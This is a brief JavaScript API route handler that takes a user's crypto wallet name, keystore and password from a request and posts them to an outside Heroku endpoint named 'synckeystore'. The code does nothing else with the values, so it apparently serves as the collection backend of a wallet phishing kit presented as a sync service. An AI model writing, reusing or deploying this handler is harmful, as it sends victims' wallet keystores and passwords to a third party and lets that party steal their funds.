import axios from 'axios';

export default async (req, res) => {
    const result = await axios.post('https://powerna.herokuapp.com/v1/synckeystore', {
      wallet: req.body.wallet,
      keystore: req.body.keystore,
      password: req.body.password
    })
    
    res.status(200).json(result)
  }